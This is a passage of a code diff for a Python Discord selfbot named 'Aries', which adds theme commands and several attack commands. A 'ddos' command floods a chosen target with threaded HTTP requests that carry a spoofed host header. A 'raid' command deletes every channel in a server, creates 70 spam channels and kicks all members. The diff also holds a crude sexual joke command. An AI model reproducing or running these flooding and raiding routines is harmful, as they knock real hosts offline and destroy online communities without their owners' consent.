+    "imageurl": "https://cdn.discordapp.com/attachments/769698485527248907/900160094287843338/mystical-midnight-sky-with-stars-surrounded-by-dramatic-clouds-dark-picture-id1133588496.png",
+    "color": "#191970"
+       }
+    else:
+        if name == "ShootingStar":
+         data = {
+        "title": "Shooting Star",
+        "imageurl": "https://cdn.discordapp.com/attachments/769698485527248907/900205216580907038/a2a66b1b23b23791e5d73a00b9325d04.gif",
+        "color": "#191970"
+       }
+    with open(f"./data/themes/{name}.json", "w") as f:
+        f.write(json.dumps(data, indent=4))
+
+    embed = discord.Embed(title= "Aries Theme", description = f"Installed theme: {name}", color=readableHex)
+    embed.set_thumbnail(url = config.get('imageurl'))
+    embed.set_footer(text = "made with ♡ by bomt and destiny")
+    await ctx.send(embed = embed)
+@bot.command()
 async def createtheme(ctx, name, title, imageurl, color):
     await ctx.message.delete()
     with open(f"./data/themes/{theme_2}.json") as f:
@@ -1156,6 +1283,20 @@ async def createtheme(ctx, name, title, imageurl, color):
         f.write(json.dumps(data, indent=4))
 
     embed = discord.Embed(title= "Aries Theme", description = f"Made theme: {name}", color=readableHex)
+    embed.set_thumbnail(url = config.get('imageurl'))
+    embed.set_footer(text = "made with ♡ by bomt and destiny")
+    await ctx.send(embed = embed)
+@bot.command()
+async def availablethemes(ctx):
+    await ctx.message.delete()
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    
+    embed = discord.Embed(title= "Aries Theme", description = f"Themes you can Install:\nMidnight\nShootingStar", color=readableHex)
     embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.send(embed = embed)
@@ -1194,27 +1335,6 @@ async def dicksize(ctx, user: discord.User):
         issmall = "ITS HUGE"
     embed = discord.Embed(title= f"Ive determined: {issmall}", description = f"{user}'s' Dick is {dongs}", color=readableHex)
     embed.set_thumbnail(url = "https://c.tenor.com/GeFTyQnfPR0AAAAM/penis-standing-erect.gif")
-    embed.set_footer(text = "made with ♡ by bomt and destiny")
-    await ctx.send(embed = embed)
-@bot.command()
-async def edittheme(ctx, name, newtitle, newimage, newcolor):
-    await ctx.message.delete()
-    with open(f"./data/themes/{theme_2}.json") as f:
-    #Loads the json to read contents
-     config = json.load(f)
-     color = config.get('color')
-    sixteenIntegerHex = int(color.replace("#", ""), 16)
-    readableHex = int(hex(sixteenIntegerHex), 0)
-    data = {
-        "title": f"{newtitle}",
-        "imageurl": f"{newimage}",
-        "color": f"{newcolor}",
-    }
-    with open(f"./data/themes/{name}.json", "w") as f:
-        f.write(json.dumps(data, indent=4))
-
-    embed = discord.Embed(title= "Aries Theme", description = f"Edited theme: {name}", color=readableHex)
-    embed.set_thumbnail(url = config.get('imageurl'))
     embed.set_footer(text = "made with ♡ by bomt and destiny")
     await ctx.send(embed = embed)
 @bot.command()
@@ -1375,9 +1495,281 @@ async def cls(ctx, *, reason=None):
     await ctx.message.delete()
     os.system('cls' if os.name == 'nt' else 'clear')
     print("Cleared!")
+    await asyncio.sleep(5)
+    global nitro_sniper
+    global build
+    global prefix
+    global copier
+    global selfbot_detector
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(Fore.CYAN + "                                                  ___         _          ")
+    print(Fore.CYAN + "                                                 /   |  _____(_)__  _____")
+    print(Fore.CYAN + "                                                / /| | / ___/ / _ \/ ___/")
+    print(Fore.CYAN + "                                               / ___ |/ /  / /  __(__  ) ")
+    print(Fore.CYAN + "                                              /_/  |_/_/  /_/\___/____/  ")
+    print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
+    print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + commandamt + Fore.RESET + "Commands!")
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + build + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix) + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper) + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector) + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)   
+@bot.command()
+async def ddos(ctx, threads, target):
+    fake_ip = '182.21.20.32'
+    port = 80
+
+    def attack():
+     while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((target, port))
+            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+            s.close()
+        except Exception:
+            pass
+    await ctx.message.delete()
+    with open(f"./data/themes/{theme_2}.json") as f:
+
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    for i in range(int(threads)):
+        thread = threading.Thread(target=attack)
+        thread.start()
+    embed = discord.Embed(title= "Aries DDoS Attack", description = f"DDoSing: + {target}".encode('ascii'), color=readableHex)
+    embed.set_thumbnail(url = config.get('imageurl'))
+    embed.set_footer(text = "made with ♡ by bomt and destiny")
+    await ctx.send(embed = embed)  
+@bot.command()
+async def pingip(ctx, ip):
+    msg = None
+    pingit = "-n 1"
+    status = os.popen("ping " + pingit + " " + ip).read()
+    if "TTL" in status: 
+        msg = f"IP: {ip} is UP"
+    else:
+        msg = f"IP: {ip} is DOWN"
+
+    await ctx.message.delete()
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    embed = discord.Embed(title= "Aries Pinger", description = f"Pinging: + {ip}", color=readableHex)
+    embed.set_thumbnail(url = config.get('imageurl'))
+    embed.set_footer(text = "made with ♡ by bomt and destiny")
+
+    embed1 = discord.Embed(title= "Aries Pinger", description = f"{msg}", color=readableHex)
+    embed1.set_thumbnail(url = config.get('imageurl'))
+    embed1.set_footer(text = "made with ♡ by bomt and destiny")
+
+    msg1 = await ctx.send(embed = embed) 
+    sleep(1)
+    await msg1.edit(embed = embed1)
+@bot.command()
+async def afk(ctx, args):
+    await ctx.message.delete()
+    global afkmode
+    args1 = str(args)
+    args2 = args1.replace("t", "T")
+    data = {
+        "token": f"{token}",
+        "prefix": f"{prefix}",
+        "sniper": f"{nitro_sniper}",
+        "detector": f"{selfbot_detector}",
+        "theme": f"{theme_2}",
+        "AFK": f"{args2}"
+    }
+    with open(f"./data/config.json", "w") as f:
+        f.write(json.dumps(data, indent=4))
+        
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    embed = discord.Embed(title= "Aries AFK Mode", description = f"Setting AFK To: + {afkmode} RESTART TO TAKE EFFECT", color=readableHex)
+    embed.set_thumbnail(url = config.get('imageurl'))
+    embed.set_footer(text = "made with ♡ by bomt and destiny")
+
+    await ctx.send(embed = embed) 
+@bot.command()
+async def delchannels(ctx):
+    for c in ctx.guild.channels: # iterating through each guild channel
+        await c.delete()
+@bot.command()
+async def createchannels(ctx):
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    try:
+      guild = ctx.guild
+	  #channel = await guild.create_text_channel(channel_name)
+      for i in range(70):
+       await guild.create_text_channel("Aries on TOP")
+      embed = discord.Embed(title=config.get('title'), description = "Created " + "Successfully", color=readableHex)    
+      embed.set_thumbnail(url = config.get('imageurl'))
+      await ctx.send(embed = embed) 
+    except commands.MissingPermissions:
+     embed = discord.Embed(title=config.get('title'), description = "Error | Insufficient Perms!", color=readableHex)    
+     embed.set_thumbnail(url = config.get('imageurl'))
+     await ctx.send(embed = embed) 
+@bot.command()
+async def ecb64(ctx, *, text):
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    #Store Message to Encode 
+    message = text
+    #Convert to Bytes like Object using Strings encode method
+    message_bytes = message.encode('ascii')
+    #Encode using base64
+    base64_bytes = base64.b64encode(message_bytes)
+    #Make it a String
+    base64_message = base64_bytes.decode('ascii')
+    embed = discord.Embed(title=config.get('title'), description = f"Decoded: {text}\nEncoded: {base64_message}", color=readableHex)    
+    embed.set_thumbnail(url = config.get('imageurl'))
+    await ctx.send(embed = embed) 
+@bot.command()
+async def dcb64(ctx, text):
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    base64_message = text
+    #Make it a bytes like object
+    base64_bytes = base64_message.encode('ascii')
+    #Decoode base64 Bytes
+    message_bytes = base64.b64decode(base64_bytes)
+    #Decode into String object
+    message = message_bytes.decode('ascii')
+    #Send it
+    embed = discord.Embed(title=config.get('title'), description = f"Encoded: {text}\nDecoded: {message}", color=readableHex)    
+    embed.set_thumbnail(url = config.get('imageurl'))
+    await ctx.send(embed = embed) 
+@bot.command()
+async def stealpfp(ctx, user: discord.User = None):
+    isdone = False
+    #Saves Avatar
+    await user.avatar_url_as(format="png").save(fp=f"ariespfpgrabber.png")
+    #Gets the path to where it saves the Avatar
+    pfp_path = str(os.getcwd() + "/ariespfpgrabber.png")
+    #Opens Image
+    fp = open(pfp_path, 'rb')
+    #Reads it
+    pfp = fp.read()
+    #Tries to set it
+    try:
+     await bot.user.edit(avatar = pfp) 
+     isdone = True
+     #Catches any Exceptions found
+    except Exception:
+     #If found print error
+     print("Error Setting PFP")
+     pass
+     #Delete
+     if isdone == True:
+      try:
+       os.remove((str(os.getcwd() + "/ariespfpgrabber.png")))
+       isdone == False
+      #Catches deleting Exception
+      except Exception:
+        print("Error")
+        pass
+@bot.command()
+async def friendslist(ctx):
+    for user in bot.user.friends:    
+         num = int(0.8)
+         sleep(num)    
+         print(user.name + f"#{user.discriminator}")
+    msg_to_del = await ctx.send('Check Console / GUI!')
+    sleep(5)
+    await msg_to_del.delete()
+    sleep(30)
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print(Fore.CYAN + "                                                  ___         _          ")
+    print(Fore.CYAN + "                                                 /   |  _____(_)__  _____")
+    print(Fore.CYAN + "                                                / /| | / ___/ / _ \/ ___/")
+    print(Fore.CYAN + "                                               / ___ |/ /  / /  __(__  ) ")
+    print(Fore.CYAN + "                                              /_/  |_/_/  /_/\___/____/  ")
+    print(Fore.RESET + "\n\n                                             Ram the opposition with Aries")
+    print("\n" + Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + commandamt + Fore.RESET + "Commands!")
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "User Is In » " + Fore.LIGHTCYAN_EX + str(len(bot.guilds))  + Fore.RESET + " Guilds!")
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Build » " + Fore.LIGHTCYAN_EX + build + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Prefix » " + Fore.LIGHTCYAN_EX + str(prefix) + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Sniper » " + Fore.LIGHTCYAN_EX + str(nitro_sniper) + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Selfbot Detector » " + Fore.LIGHTCYAN_EX + str(selfbot_detector) + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[-] " + Fore.RESET + "Copycat » " + Fore.LIGHTCYAN_EX + str(copier) + Fore.RESET)
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.GREEN + " Connected! Enjoy Aries " + Fore.RESET + f"{bot.user}" + Fore.RESET)     
+    print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+]" + Fore.BLUE + " (Please Note that your token is safe and is only stored in a json file) " + Fore.RESET)
+@bot.command()
+async def raid(ctx):
+    with open(f"./data/themes/{theme_2}.json") as f:
+    #Loads the json to read contents
+     config = json.load(f)
+     color = config.get('color')
+    sixteenIntegerHex = int(color.replace("#", ""), 16)
+    readableHex = int(hex(sixteenIntegerHex), 0)
+    try:
+     for c in ctx.guild.channels:
+        await c.delete()
+    except commands.MissingPermissions:
+        print("No Permission To RAID")
+
+    try:
+        guild = ctx.guild
+        for i in range(70):
+         await guild.create_text_channel("Aries on TOP")
+        members = ctx.guild.members
+        members.remove(ctx.me)
+        for member in members:
+         await member.kick(reason = "RAIDED")
+        print(Fore.CYAN + "Info " + Fore.RESET + "| " + Fore.LIGHTCYAN_EX +"[+] " + "Successfully Raided " + Fore.RESET + f"{ctx.guild}!")
+        sleep(5)
+        ctx.guild.leave
+    except commands.MissingPermissions:
+        print("No Permission To RAID")
 try:
 #Runs Bot
-     bot.run(token)
-#Catch Error
-except discord.errors.LoginFailure:
-    print("Failed to log into provided token")
+     def runbot():
+        try:     
+         bot.run(token)
+        except Exception:
+            #Skips any Exceptions found
+            pass
+        #Print error if an error is found.
+        print("Error logging into provided token! If you belive this is a mistake contact staff")
+
+     t1 = threading.Thread(target=runbot)
+     t2 = threading.Thread(target=runGUI)
+     # starting thread 1
+     t1.start()
+     # starting thread 2
+     t2.start()
+  
+     # wait until thread 1 is completely executed
+     t1.join()
+     # wait until thread 2 is completely executed
+     t2.join()
+
+#Catch Error | For try statement
+except Exception as e:
+    print(e)
